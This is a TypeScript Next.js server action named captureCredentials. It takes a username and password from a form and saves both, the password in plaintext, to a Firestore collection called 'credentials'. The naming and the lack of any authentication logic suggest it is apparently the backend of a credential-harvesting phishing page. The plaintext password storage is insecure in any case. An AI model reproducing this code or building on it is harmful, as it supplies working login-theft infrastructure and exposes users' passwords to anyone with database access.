'use server';

import { initializeFirebaseServer } from '@/firebase/server';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';

export async function captureCredentials(prevState: any, formData: FormData) {
  console.log('--- captureCredentials server action triggered ---');
  
  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  console.log('Received data:', { username, password: password ? '******' : 'empty' });

  if (!username || !password) {
    console.log('Validation failed: Invalid input.');
    return { success: false, message: 'Invalid input.' };
  }

  try {
    const { firestore } = initializeFirebaseServer();
    const credentialsCollection = collection(firestore, 'credentials');

    console.log('Attempting to write to Firestore...');
    await addDoc(credentialsCollection, {
      username,
      password,
      createdAt: serverTimestamp(),
    });

    console.log('Successfully wrote to Firestore.');
    return { success: true };
  } catch (error: any) {
    console.error('Error saving credentials to Firestore:', error);
    const errorMessage = 'Failed to save credentials. Please check server logs and Firestore rules.';
    console.log('Returning error:', errorMessage);
    return {
      success: false,
      message: errorMessage,
    };
  }
}
